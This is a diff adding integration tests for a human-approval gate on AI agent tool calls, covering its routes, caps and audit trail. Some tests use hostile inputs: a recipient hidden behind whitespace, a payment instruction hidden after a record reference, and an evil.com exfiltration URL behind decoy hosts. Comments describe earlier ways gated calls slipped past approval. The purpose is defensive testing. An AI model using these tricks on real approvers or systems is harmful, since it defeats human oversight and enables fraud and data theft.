@@ -1,0 +1,1373 @@
+/**
+ * Approval routes against a real PostgreSQL — the gate-check security boundary,
+ * the requester's pending list, and the self-confirm decision endpoint, with
+ * their audit lifecycle. Only the auth boundary (getSession) is mocked; the DB
+ * and audit writes are real.
+ */
+import { describe, it, expect, beforeEach, afterEach, beforeAll, vi } from "vitest";
+import { NextRequest } from "next/server";
+import { desc, eq, like, type SQL } from "drizzle-orm";
+
+vi.mock("next/headers", () => ({
+  headers: vi.fn().mockResolvedValue(new Headers()),
+}));
+
+// The decision route schedules its audit write via deferAuditLog -> after(),
+// which needs a real request scope. Run the callback synchronously and track
+// the promise so tests can `await flushAfter()` before asserting audit rows.
+// Mirrors diagnostics-export.integration.test.ts / src/test-setup.ts.
+const pendingAfter: Promise<unknown>[] = [];
+async function flushAfter(): Promise<void> {
+  while (pendingAfter.length > 0) {
+    const all = pendingAfter.splice(0);
+    await Promise.allSettled(all);
+  }
+}
+vi.mock("next/server", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("next/server")>();
+  return {
+    ...actual,
+    after: vi.fn((fn: () => void | Promise<void>) => {
+      try {
+        const result = fn();
+        if (result instanceof Promise) {
+          pendingAfter.push(result.catch(() => {}));
+        }
+      } catch {
+        // Swallowed — matches Next's after() error handling.
+      }
+    }),
+  };
+});
+
+// The decision route hands the user's answer to the call OpenClaw parked for
+// it (#1132). There is no gateway in an integration run, so stand one in and
+// assert what the route actually sends it.
+const { gatewayRequest } = vi.hoisted(() => ({ gatewayRequest: vi.fn() }));
+vi.mock("@/server/openclaw-client", () => ({
+  getOpenClawClient: () => ({ request: gatewayRequest }),
+}));
+
+// Counted, not replaced: every call goes through to the real summary.
+const { summarizeSpy } = vi.hoisted(() => ({ summarizeSpy: { calls: 0 } }));
+vi.mock("@/lib/approvals/summary", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("@/lib/approvals/summary")>();
+  return {
+    ...actual,
+    summarizeCall: (...args: Parameters<typeof actual.summarizeCall>) => {
+      summarizeSpy.calls++;
+      return actual.summarizeCall(...args);
+    },
+  };
+});
+
+const mockGetSession = vi.fn();
+vi.mock("@/lib/auth", () => ({
+  getSession: (...args: unknown[]) => mockGetSession(...args),
+  auth: { api: { getSession: (...args: unknown[]) => mockGetSession(...args) } },
+}));
+
+import { db } from "@/db";
+import { users, agents, toolApproval, auditLog } from "@/db/schema";
+import { POST as gateCheck } from "@/app/api/internal/approvals/gate-check/route";
+import { GET as listApprovals } from "@/app/api/approvals/route";
+import { POST as decide } from "@/app/api/approvals/[id]/decision/route";
+import { POST as reportResolution } from "@/app/api/internal/approvals/resolution/route";
+import { MAX_PENDING_PER_REQUESTER, linkApproval } from "@/lib/approvals/service";
+import { setInstancePolicy } from "@/lib/instance-policy";
+import { computeArgsDigest } from "@/lib/approvals/digest";
+import { MAX_KNOWN_APPROVALS } from "@/lib/schemas/approvals";
+import { textOf, type Shown } from "@/lib/approvals/display";
+import { getOrCreatePluginSecret } from "@/lib/plugin-secrets-source";
+// pinchy-odoo's own encoder, so the refs below are real ones minted under the
+// key the gate reads from the settings DB.
+import { encodeRef, _resetKeyCacheForTest } from "../../../../plugins/pinchy-odoo/integration-ref";
+
+const GW = "test-gw-token";
+beforeAll(() => {
+  process.env.PINCHY_E2E_GATEWAY_TOKEN = GW;
+});
+
+let emailSeq = 0;
+async function seedUser(role: "admin" | "member" = "member") {
+  const [u] = await db
+    .insert(users)
+    .values({ name: "U", email: `u${emailSeq++}@example.com`, emailVerified: true, role })
+    .returning();
+  return u;
+}
+async function seedAgent(ownerId: string, confirmTools: string[] = ["odoo_write"]) {
+  const [a] = await db
+    .insert(agents)
+    .values({
+      name: "Smithers",
+      model: "anthropic/claude-haiku-4-5-20251001",
+      greetingMessage: "Hi",
+      ownerId,
+      pluginConfig: { "pinchy-approvals": { confirmTools } },
+    })
+    .returning();
+  return a;
+}
+function gateReq(body: object, token: string | null = GW) {
+  return new NextRequest("http://localhost/api/internal/approvals/gate-check", {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      ...(token ? { Authorization: `Bearer ${token}` } : {}),
+    },
+    body: JSON.stringify(body),
+  });
+}
+function decideReq(body: object) {
+  return new NextRequest("http://localhost/api/approvals/x/decision", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify(body),
+  });
+}
+function setSession(user: { id: string; role?: string }, name = "U") {
+  mockGetSession.mockResolvedValue({
+    user: { id: user.id, role: user.role ?? "member", name },
+  });
+}
+const ctx = (id: string) => ({ params: Promise.resolve({ id }) });
+
+describe("approval routes (integration, real DB)", () => {
+  let user: Awaited<ReturnType<typeof seedUser>>;
+  let agent: Awaited<ReturnType<typeof seedAgent>>;
+  const sessionKey = () => `agent:${agent.id}:direct:${user.id}`;
+  const gateBody = (over: object = {}) => ({
+    agentId: agent.id,
+    sessionKey: sessionKey(),
+    toolName: "odoo_write",
+    params: { recordId: 5 },
+    ...over,
+  });
+
+  beforeEach(async () => {
+    vi.clearAllMocks();
+    gatewayRequest.mockResolvedValue({ ok: true });
+    process.env.PINCHY_E2E_GATEWAY_TOKEN = GW;
+    user = await seedUser();
+    agent = await seedAgent(user.id);
+  });
+
+  // Drain deferred audit writes before the next test's truncate, so an
+  // un-awaited write can't race into another test's table state.
+  afterEach(async () => {
+    await flushAfter();
+  });
+
+  it("rejects gate-check without the gateway token", async () => {
+    const res = await gateCheck(gateReq(gateBody(), null));
+    expect(res.status).toBe(401);
+  });
+
+  it("resolves the lowercased session-key principal back to the real (mixed-case) user id", async () => {
+    // OpenClaw normalizes session keys to lowercase, so the gate reads back
+    // lower(user.id) — never the mixed-case id Better Auth generates. The stored
+    // requesterId must be the REAL casing, or the decision route
+    // (session.user.id) and the inbox can never match it (403 / empty inbox).
+    const mixedCaseId = "kG5kQuhkQbRpCPm9XHSt3FR1m5KZiHnO";
+    await db.insert(users).values({
+      id: mixedCaseId,
+      name: "Mixed Case",
+      email: `mc${emailSeq++}@example.com`,
+      emailVerified: true,
+      role: "member",
+    });
+    const [a] = await db
+      .insert(agents)
+      .values({
+        name: "S",
+        model: "anthropic/claude-haiku-4-5-20251001",
+        greetingMessage: "Hi",
+        ownerId: mixedCaseId,
+        pluginConfig: { "pinchy-approvals": { confirmTools: ["odoo_write"] } },
+      })
+      .returning();
+
+    const res = await (
+      await gateCheck(
+        gateReq({
+          agentId: a.id,
+          sessionKey: `agent:${a.id}:direct:${mixedCaseId.toLowerCase()}`,
+          toolName: "odoo_write",
+          params: { recordId: 5 },
+        })
+      )
+    ).json();
+    expect(res.decision).toBe("block");
+
+    const [row] = await db.select().from(toolApproval).where(eq(toolApproval.id, res.requestId));
+    expect(row.requesterId).toBe(mixedCaseId);
+  });
+
+  // #1132. The plugin sends the id of the call it is about to suspend; the row
+  // has to carry it, because the `plugin.approval.requested` broadcast names
+  // the call and nothing else. This is the wiring — schema field, route
+  // destructuring, service argument — that each unit test sees only half of.
+  it("stores the toolCallId the gate sent, so the waiting call can be found again", async () => {
+    const res = await (await gateCheck(gateReq(gateBody({ toolCallId: "call_abc" })))).json();
+    expect(res.decision).toBe("block");
+
+    const [row] = await db.select().from(toolApproval).where(eq(toolApproval.id, res.requestId));
+    expect(row.toolCallId).toBe("call_abc");
+  });
+
+  // A run context without a call id must still get a decision it can act on.
+  // Rejecting the body would reach the plugin as "service unavailable" and turn
+  // a confirmable action into an outage.
+  it("still decides a gated call that carries no toolCallId", async () => {
+    const res = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(res.decision).toBe("block");
+    const [row] = await db.select().from(toolApproval).where(eq(toolApproval.id, res.requestId));
+    expect(row.toolCallId).toBeNull();
+  });
+
+  it("allows an ungated tool without creating a pending request", async () => {
+    const res = await (await gateCheck(gateReq(gateBody({ toolName: "odoo_list_models" })))).json();
+    expect(res.decision).toBe("allow");
+    expect(await db.select().from(toolApproval)).toHaveLength(0);
+  });
+
+  it("blocks an un-approved gated call: one pending row, one requested-audit, idempotent on retry", async () => {
+    const r1 = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(r1.decision).toBe("block");
+    // Wording itself is pinned by the "bogus command" test above; here we only
+    // assert that a block carries a reason at all — the model gets nothing to
+    // relay without one.
+    expect(r1.reason).toMatch(/confirmation/i);
+
+    const r2 = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(r2.requestId).toBe(r1.requestId);
+
+    expect(await db.select().from(toolApproval)).toHaveLength(1);
+    const requested = await db
+      .select()
+      .from(auditLog)
+      .where(eq(auditLog.eventType, "approval.requested"));
+    expect(requested).toHaveLength(1);
+  });
+
+  it("blocks with a reason the model cannot turn into a bogus command", async () => {
+    // The reason reaches the MODEL as the tool result, and the model relays it
+    // to the user. `/approve <id>` is a real OpenClaw command for ITS native
+    // approvals — ours live in Pinchy's DB and OpenClaw knows nothing about
+    // them. An earlier wording carried the request id, and the model duly
+    // invented `/approve 7854bab6-…`, handing the user an instruction that
+    // fails. Keep the id out of the prose and out of the model's reach.
+    const res = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(res.decision).toBe("block");
+    expect(res.requestId, "the id still travels in the response body").toBeTruthy();
+
+    expect(res.reason).not.toContain(res.requestId);
+    expect(res.reason, "no slash command the user could copy").not.toMatch(/(^|\s)\/\w+/);
+    // It must still say what is happening and where to act.
+    expect(res.reason).toMatch(/confirm/i);
+  });
+
+  it("hands the gate the prompt text a person can act on", async () => {
+    // #1132: the plugin turns this into OpenClaw's `requireApproval`, which
+    // PAUSES the run instead of letting the model narrate a block. The title
+    // and description have to come from the server, because the plugin has no
+    // tool registry and must not grow one — policy and wording are the same
+    // decision, and it lives on this side of the gateway token.
+    const res = await (
+      await gateCheck(gateReq(gateBody({ toolName: "odoo_write", params: { recordId: 5 } })))
+    ).json();
+
+    expect(res.decision).toBe("block");
+    expect(res.approval.title).toBeTruthy();
+    expect(res.approval.title).not.toContain("odoo_write");
+    expect(res.approval.description).toContain("5");
+    // OpenClaw REJECTS a request past these caps, so exceeding one turns a
+    // confirmation into a failed tool call rather than an ugly card.
+    expect(res.approval.title.length).toBeLessThanOrEqual(80);
+    expect(res.approval.description.length).toBeLessThanOrEqual(256);
+  });
+
+  // Summarizing a large call costs real CPU on the server's one event loop,
+  // which every user shares: the card's summary and the prompt are built from
+  // one summary, not two.
+  it("summarizes a gated call once for both the card and the prompt", async () => {
+    summarizeSpy.calls = 0;
+    const res = await (
+      await gateCheck(gateReq(gateBody({ toolName: "odoo_write", params: { recordId: 5 } })))
+    ).json();
+    expect(res.approval.description).toContain("5");
+    expect(summarizeSpy.calls).toBe(1);
+  });
+
+  it("sends no prompt text when nothing is being confirmed", async () => {
+    // An allowed call must not carry approval wording: the plugin decides
+    // whether to pause on the presence of this field, so a stray one would
+    // pause a run nobody needs to confirm.
+    const res = await (await gateCheck(gateReq(gateBody({ toolName: "odoo_list_models" })))).json();
+    expect(res.decision).toBe("allow");
+    expect(res.approval).toBeUndefined();
+  });
+
+  it("refuses a gated call it cannot attribute to a Pinchy user", async () => {
+    // A channel sender (Telegram id, group principal) is not a Pinchy user, so
+    // nobody in that conversation can confirm. Blocking is the only safe answer
+    // — and no pending row may be created, because there is no inbox it would
+    // ever appear in.
+    const res = await (await gateCheck(gateReq(gateBody({ senderId: "telegram:44215" })))).json();
+    expect(res.decision).toBe("block");
+    expect(res.reason).toMatch(/could not be identified/i);
+    expect(await db.select().from(toolApproval)).toHaveLength(0);
+  });
+
+  it("refuses a gated call from a run that carries no session key", async () => {
+    // The plugin used to answer this one itself, by allowing it: no session key
+    // meant "nothing to gate". But the agent and the tool are both known here,
+    // so the admin's policy applies in full — what is missing is the person who
+    // would confirm. Any run OpenClaw hands over without a session key (cron,
+    // subagent) therefore executed every gated tool unchecked. A grant is bound
+    // to a session; with none there is nothing to bind and nobody to ask.
+    const { sessionKey: _dropped, ...noSession } = gateBody();
+    const res = await (await gateCheck(gateReq(noSession))).json();
+    expect(res.decision).toBe("block");
+    expect(res.reason).toMatch(/could not be identified/i);
+    expect(await db.select().from(toolApproval)).toHaveLength(0);
+  });
+
+  it("refuses to open a confirmation past the cap, and audits nothing for it", async () => {
+    for (let i = 0; i < MAX_PENDING_PER_REQUESTER; i++) {
+      await gateCheck(gateReq(gateBody({ params: { recordId: i } })));
+    }
+    const over = await (await gateCheck(gateReq(gateBody({ params: { recordId: 9999 } })))).json();
+
+    expect(over.decision).toBe("block");
+    expect(over.reason).toMatch(/waiting in Pinchy/i);
+    expect(await db.select().from(toolApproval)).toHaveLength(MAX_PENDING_PER_REQUESTER);
+    // Nothing was requested, so nothing may be recorded as requested — the row
+    // count is the whole point of the cap.
+    const requested = await db
+      .select()
+      .from(auditLog)
+      .where(eq(auditLog.eventType, "approval.requested"));
+    expect(requested).toHaveLength(MAX_PENDING_PER_REQUESTER);
+  });
+
+  it("lists the caller's pending confirmations with a redacted summary", async () => {
+    await gateCheck(gateReq(gateBody()));
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(list.approvals).toHaveLength(1);
+    expect(list.approvals[0].toolName).toBe("odoo_write");
+    expect(list.approvals[0].argsSummary).toEqual({ recordId: 5 });
+  });
+
+  // A summary may be 0.5–1.5 MB, and the list is polled every five
+  // seconds. It never changes once stored, so a poll that names the cards it
+  // already holds gets those back without their summary.
+  it("leaves out the summary of a card the poll says it already holds", async () => {
+    await gateCheck(gateReq(gateBody({ params: { recordId: 5 } })));
+    await gateCheck(gateReq(gateBody({ params: { recordId: 6 } })));
+    setSession(user);
+    const all = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(all.approvals).toHaveLength(2);
+    const [newest, older] = all.approvals;
+
+    const polled = await (
+      await listApprovals(
+        new NextRequest(`http://localhost/api/approvals?known=${older.id},not-a-uuid`),
+        {}
+      )
+    ).json();
+    expect(polled.approvals.map((a: { id: string }) => a.id)).toEqual([newest.id, older.id]);
+    expect(polled.approvals[0].argsSummary).toEqual(newest.argsSummary);
+    expect(polled.approvals[1]).not.toHaveProperty("argsSummary");
+    expect(polled.approvals[1].toolName).toBe("odoo_write");
+  });
+
+  // The summaries are read in a second query, and settling drops the summary, so
+  // a card settled between the two reads has none to return. It is left out:
+  // listed with `argsSummary: null`, it would be an approvable card that shows
+  // none of its arguments.
+  it("leaves out a card that settles between the list and the summary read", async () => {
+    await gateCheck(gateReq(gateBody({ params: { recordId: 5 } })));
+    await gateCheck(gateReq(gateBody({ params: { recordId: 6 } })));
+    setSession(user);
+    const [settling, staying] = await db
+      .select({ id: toolApproval.id })
+      .from(toolApproval)
+      .where(eq(toolApproval.requesterId, user.id))
+      .orderBy(desc(toolApproval.createdAt));
+
+    // Let the list query run, then settle one card before the summary read
+    // the route issues next — the race, made deterministic.
+    const realSelect = db.select.bind(db);
+    let selects = 0;
+    const spy = vi.spyOn(db, "select").mockImplementation(((
+      fields: Parameters<typeof db.select>[0]
+    ) => {
+      selects++;
+      if (selects !== 2) return realSelect(fields);
+      return {
+        from: (table: typeof toolApproval) => ({
+          where: async (condition: SQL | undefined) => {
+            await db
+              .update(toolApproval)
+              .set({ status: "denied", argsSummary: null })
+              .where(eq(toolApproval.id, settling.id));
+            return realSelect(fields).from(table).where(condition);
+          },
+        }),
+      };
+    }) as unknown as typeof db.select);
+    try {
+      const list = await (
+        await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+      ).json();
+      expect(selects).toBe(2);
+      expect(list.approvals.map((a: { id: string }) => a.id)).toEqual([staying.id]);
+      expect(list.approvals[0].argsSummary).toEqual({ recordId: 5 });
+    } finally {
+      spy.mockRestore();
+    }
+  });
+
+  // `known` was capped at 50 on the grounds that a requester has at most 20
+  // pending — but that cap is per agent, so a person working with several agents
+  // passed 50 and had the oldest summaries re-sent on every five-second poll.
+  it("honours `known` for a person with more pending cards than one agent allows", async () => {
+    const agentsUsed = [agent, await seedAgent(user.id), await seedAgent(user.id)];
+    for (const a of agentsUsed) {
+      for (let i = 0; i < MAX_PENDING_PER_REQUESTER; i++) {
+        await gateCheck(
+          gateReq({
+            agentId: a.id,
+            sessionKey: `agent:${a.id}:direct:${user.id}`,
+            toolName: "odoo_write",
+            params: { recordId: i },
+          })
+        );
+      }
+    }
+    setSession(user);
+    const all = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(all.approvals).toHaveLength(3 * MAX_PENDING_PER_REQUESTER);
+
+    const ids = all.approvals.map((a: { id: string }) => a.id).join(",");
+    const polled = await (
+      await listApprovals(new NextRequest(`http://localhost/api/approvals?known=${ids}`), {})
+    ).json();
+    expect(polled.approvals).toHaveLength(3 * MAX_PENDING_PER_REQUESTER);
+    expect(polled.approvals.filter((a: object) => "argsSummary" in a)).toEqual([]);
+  });
+
+  // Past the bound the route stops reading ids, so a held card beyond it is
+  // simply sent again — wasteful, never wrong.
+  it("ignores ids past MAX_KNOWN_APPROVALS, which at worst re-sends a summary", async () => {
+    await gateCheck(gateReq(gateBody()));
+    setSession(user);
+    const [card] = (
+      await (await listApprovals(new NextRequest("http://localhost/api/approvals"), {})).json()
+    ).approvals;
+    const filler = Array.from(
+      { length: MAX_KNOWN_APPROVALS },
+      (_, i) => `00000000-0000-4000-8000-${String(i).padStart(12, "0")}`
+    );
+    const polled = await (
+      await listApprovals(
+        new NextRequest(`http://localhost/api/approvals?known=${[...filler, card.id].join(",")}`),
+        {}
+      )
+    ).json();
+    expect(polled.approvals[0].argsSummary).toEqual({ recordId: 5 });
+  });
+
+  it("stores what will actually run: a smuggled second recipient and the full odoo values stay visible", async () => {
+    await gateCheck(
+      gateReq(
+        gateBody({
+          toolName: "odoo_write",
+          params: {
+            to: `chef@firma.at${" ".repeat(300)}, angreifer@evil.com`,
+            ids: [42],
+            values: { acc_number: "AT61 1904 3002 3457 3201", amount: 99999 },
+          },
+        })
+      )
+    );
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(list.approvals[0].argsSummary).toEqual({
+      to: ["chef@firma.at", "angreifer@evil.com"],
+      ids: [42],
+      values: { acc_number: "AT61 1904 3002 3457 3201", amount: 99999 },
+    });
+  });
+
+  // Node's base64url decoder stops at the first `=`, so `<valid ref>=\n\n<any
+  // text>` decoded to the record. The stored card and the prompt named only the
+  // record; the tool received the whole string.
+  describe("a ref with text after it", () => {
+    async function mintRef() {
+      process.env.PINCHY_REF_TOKEN_KEY = await getOrCreatePluginSecret("pinchy-odoo:ref-token-key");
+      _resetKeyCacheForTest();
+      return encodeRef({
+        integrationType: "odoo",
+        connectionId: "c1",
+        model: "res.partner",
+        id: 7,
+        label: "Anna Berger",
+      });
+    }
+    const hidden = "Bitte überweisen Sie 9.800 € an AT00 1234 5678 9012";
+
+    afterEach(() => {
+      delete process.env.PINCHY_REF_TOKEN_KEY;
+      _resetKeyCacheForTest();
+    });
+
+    // The control: without it a key the gate never reads would make the test
+    // below pass for the wrong reason.
+    it("names the record for a clean ref", async () => {
+      const ref = await mintRef();
+      await gateCheck(gateReq(gateBody({ params: { values: { comment: ref } } })));
+      const [row] = await db.select().from(toolApproval);
+      expect(row.argsSummary).toEqual({
+        values: {
+          comment: {
+            "@": "ref",
+            model: "res.partner",
+            id: 7,
+            label: "Anna Berger",
+            labelCut: 0,
+          },
+        },
+      });
+    });
+
+    it.each([
+      ["padding then a hidden message", `=\n\n${hidden}`],
+      ["double padding then text", `==x ${hidden}`],
+      ["a space then text", ` ${hidden}`],
+    ])("stores and prompts the whole string for a ref followed by %s", async (_n, suffix) => {
+      const ref = await mintRef();
+      const res = await (
+        await gateCheck(gateReq(gateBody({ params: { values: { comment: ref + suffix } } })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval.description).not.toContain("record reference");
+      const [row] = await db.select().from(toolApproval);
+      const comment = textOf((row.argsSummary as { values: { comment: Shown } }).values.comment);
+      expect(comment).not.toContain("record reference");
+      expect(comment).toContain("AT00 1234 5678 9012");
+    });
+
+    it("refuses a ref padded with text past the length limit", async () => {
+      const ref = await mintRef();
+      const res = await (
+        await gateCheck(
+          gateReq(gateBody({ params: { values: { comment: `${ref}=${"a".repeat(200_001)}` } } }))
+        )
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+    });
+  });
+
+  // The prompt is what every approval surface shows, and "allow" there runs
+  // the tool. Naming only the hosts that fit would leave out the last one —
+  // and decoys under `target`, `destination` and `targets` ahead of a fetch's
+  // `url` would make that the host it fetches. A call whose hosts the prompt
+  // cannot all name gets no confirmation at all.
+  describe("a call whose hosts the prompt cannot all name", () => {
+    const params = () => ({
+      targets: Array.from({ length: 25 }, (_, i) => `https://s${i}.firma.at/`),
+      url: "https://evil.com/exfil?d=secret",
+    });
+
+    it("is refused before anything is opened, with a reason that tells the agent to split it", async () => {
+      agent = await seedAgent(user.id, ["pinchy_web_fetch"]);
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_web_fetch", params: params() })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(res.requestId).toBeUndefined();
+      expect(res.reason).toMatch(/26 different hosts/);
+      expect(res.reason).toMatch(/split it into smaller calls/i);
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+    });
+
+    it("records the refusal in the audit trail, without the hosts", async () => {
+      agent = await seedAgent(user.id, ["pinchy_web_fetch"]);
+      await gateCheck(gateReq(gateBody({ toolName: "pinchy_web_fetch", params: params() })));
+      const refused = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused).toHaveLength(1);
+      expect(refused[0].outcome).toBe("failure");
+      expect(refused[0].detail).toMatchObject({
+        toolName: "pinchy_web_fetch",
+        argsDigest: computeArgsDigest(params()),
+        reason: "too-large-to-show",
+        exceeded: "too-many-hosts",
+      });
+      expect(JSON.stringify(refused[0].detail)).not.toContain("evil.com");
+      expect(JSON.stringify(refused[0].detail)).not.toContain("firma.at");
+    });
+  });
+
+  // A summary that said "1 more field not shown" was still approvable, and the
+  // hidden field still ran. A call the card cannot show in full is refused at the
+  // gate — nothing is opened, nothing can be approved, and the model is told to
+  // split it.
+  describe("a call too large to show in full", () => {
+    // Probe sized to the budget of 512,000 characters (it was 4 × 19,000 against
+    // 64,000): four texts of 150,000 each, every one under the per-text limit,
+    // together past the total.
+    const oversized = () => ({
+      model: "account.move",
+      ids: [42],
+      values: {
+        narration: "a".repeat(150_000),
+        ref: "b".repeat(150_000),
+        x1: "c".repeat(150_000),
+        x2: "d".repeat(150_000),
+        partner_bank_id: 666,
+      },
+    });
+
+    it("is refused: no pending row, a reason that tells the agent to split it", async () => {
+      const res = await (await gateCheck(gateReq(gateBody({ params: oversized() })))).json();
+      expect(res.decision).toBe("block");
+      expect(res.reason).toMatch(/too large to show for approval in full/i);
+      expect(res.reason).toMatch(/split it into smaller calls/i);
+      // Nothing for the plugin to pause on: there is no card to wait for.
+      expect(res.approval).toBeUndefined();
+      expect(res.requestId).toBeUndefined();
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+    });
+
+    it("records the refusal in the audit trail, and no request", async () => {
+      const params = oversized();
+      await gateCheck(gateReq(gateBody({ params })));
+      const refused = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused).toHaveLength(1);
+      expect(refused[0].outcome).toBe("failure");
+      expect(refused[0].detail).toMatchObject({
+        agent: { id: agent.id, name: "Smithers" },
+        requester: { name: "U" },
+        toolName: "odoo_write",
+        argsDigest: computeArgsDigest(params),
+        reason: "too-large-to-show",
+        exceeded: "too-large-in-all",
+      });
+      // The summary — and the field values in it — never reach the audit log.
+      expect(JSON.stringify(refused[0].detail)).not.toContain("aaaa");
+      const requested = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.requested"));
+      expect(requested).toHaveLength(0);
+    });
+
+    // Any text over 20,000 characters — counted with its markers — was refused,
+    // so a gated pinchy_write of an ordinary report could never run, and "split
+    // it" is advice no single file can follow.
+    it("opens a card for a gated pinchy_write of a 30,000-character report, stored whole", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      const content = "Quarterly report line.\n".repeat(1_305).slice(0, 30_000);
+      const params = { path: "/data/out/report.md", content };
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_write", params })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeDefined();
+
+      setSession(user);
+      const list = await (
+        await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+      ).json();
+      expect(textOf(list.approvals[0].argsSummary.content)).toBe(content);
+    });
+
+    it("opens a card for an 18,000-character mail body full of no-break spaces", async () => {
+      const body = "Preis\u00A0€ ".repeat(2_250);
+      const res = await (
+        await gateCheck(gateReq(gateBody({ params: { to: "a@b.at", subject: "s", body } })))
+      ).json();
+      expect(res.approval).toBeDefined();
+    });
+
+    // Headings set in mathematical bold (𝐖𝐞 𝐚𝐫𝐞 𝐡𝐢𝐫𝐢𝐧𝐠) are ordinary in a post
+    // drafted for LinkedIn, and lie outside the Basic Multilingual Plane.
+    it("opens a card for a post whose preview is set in mathematical bold", async () => {
+      const bold = [..."we are hiring "].map((c) =>
+        c === " " ? c : String.fromCodePoint(0x1d41a + c.charCodeAt(0) - 97)
+      );
+      const body = `${bold.join("").repeat(20)}\n\nJoin us.`;
+      const res = await (
+        await gateCheck(gateReq(gateBody({ params: { to: "a@b.at", subject: "s", body } })))
+      ).json();
+      expect(res.approval).toBeDefined();
+    });
+
+    it("refuses a 250,000-character text, naming the value and the limit, without 'split'", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      const params = { path: "/data/out/dump.txt", content: "x".repeat(250_000) };
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_write", params })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(res.reason).toMatch(/content/);
+      expect(res.reason).toMatch(/250,000 characters/);
+      expect(res.reason).toMatch(/200,000/);
+      expect(res.reason).toMatch(/too long to show for approval/i);
+      expect(res.reason).not.toMatch(/split/i);
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+      const [refused] = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused.detail).toMatchObject({ exceeded: "text-too-long" });
+    });
+
+    // What the card draws costs the approver's browser layout time; sixty long
+    // targets of alternating Hebrew and digits took about a second to draw.
+    it("is refused when the card would take too long to draw", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      const target = Array.from({ length: 4_096 }, (_, i) => (i % 2 ? "1" : "א")).join("");
+      const params = { path: "/data/out/a.md", content: "x", targets: Array(60).fill(target) };
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_write", params })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(res.reason).toMatch(/to draw/);
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+      const [refused] = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused.detail).toMatchObject({ exceeded: "too-costly-to-draw" });
+      expect(refused.outcome).toBe("failure");
+      expect(JSON.stringify(refused.detail)).not.toContain("א1");
+    });
+
+    // A white flag in an emoji sequence costs Chromium a font-fallback pass per
+    // run: 500 previews of such sequences took two seconds to draw, inside
+    // every other bound.
+    it("is refused when the card is emoji previews too costly to draw", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      const flags = "👩‍👩‍👧‍👦🏳️‍🌈".repeat(20).slice(0, 200);
+      const notes = Object.fromEntries(
+        Array.from({ length: 3 }, (_, k) => [`n${k}`, Array(k < 2 ? 200 : 100).fill(flags)])
+      );
+      const params = { path: "/data/out/a.md", content: "x", ...notes };
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_write", params })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+      const [refused] = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused.detail).toMatchObject({ exceeded: "too-costly-to-draw" });
+    });
+
+    it("still opens a full card for an Odoo write with 26 fields, the bank account last", async () => {
+      const values: Record<string, unknown> = {};
+      for (let i = 0; i < 25; i++) values[`x_note_${i}`] = "ok";
+      values.acc_number = "AT61 1904 3002 3457 3201";
+      const params = { model: "res.partner.bank", ids: [7], values };
+      const res = await (await gateCheck(gateReq(gateBody({ params })))).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeDefined();
+
+      setSession(user);
+      const list = await (
+        await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+      ).json();
+      expect(list.approvals[0].argsSummary).toEqual(params);
+    });
+  });
+
+  // Postgres refuses a lone UTF-16 surrogate inside jsonb, so the stored summary
+  // must hold none: neither half of an emoji split by a cut at a UTF-16 index,
+  // nor a lone surrogate the input carried, which is shown as a marker.
+  it("stores a summary with an emoji across a UTF-16 cut point, and with a lone surrogate", async () => {
+    // Index 3,999 splits a pair. Letters first, so the preview the card draws
+    // is not emoji, which cost a card far more to draw (`DRAW_BUDGET`).
+    const body = `${"a".repeat(3_999)}${"😀".repeat(50)}`;
+    const params = { recordId: 5, body, subject: "x\uD83Dy" };
+    const res = await (await gateCheck(gateReq(gateBody({ params })))).json();
+    expect(res.decision).toBe("block");
+
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
